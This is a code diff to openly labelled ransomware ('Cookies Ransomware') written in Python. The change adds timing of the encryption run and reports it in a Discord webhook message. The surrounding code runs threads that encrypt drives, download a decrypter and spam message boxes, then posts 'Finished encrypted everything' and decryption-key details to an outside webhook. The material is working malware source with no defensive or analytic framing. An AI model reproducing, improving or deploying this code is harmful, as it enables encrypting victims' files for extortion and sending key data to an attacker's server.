@@ -7,12 +7,12 @@ import webbrowser
 import urllib.request
 import urllib
 import httpx
+import time
 import tkinter as tk
 from threading import *
 from time import *
 
 from urllib.request import urlopen
-from time import sleep
 
 from tokens import *
 
@@ -751,6 +751,7 @@ h = Thread(target = E_drive)
 download = Thread(target = download_decrypter)
 message = Thread(target = spam_messagebox)
 
+start = time.time()
 c.start()
 d.start()
 e.start()
@@ -771,7 +772,8 @@ h.join()
 a.join()
 b.join()
 
-
+end = time.time()
+encrpyt_time = (end - start)
 embed = {
     'username' : 'Cookies Ransomware',
     'avatar_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif',
@@ -783,7 +785,7 @@ embed = {
                 'icon_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif'
             },
             'color': 16119101,
-            'description': f'Finished encrypted everything',
+            'description': f'Finished encrypted everything - Time to encrypt everything {(encrpyt_time)}',
             'fields': [
                 {
                     'name': '\u200b',
@@ -802,7 +804,6 @@ Keys to decrypt:
         }
     ]
 }
-
 httpx.post(webhook, json=embed)
 download.start()
 message.start()
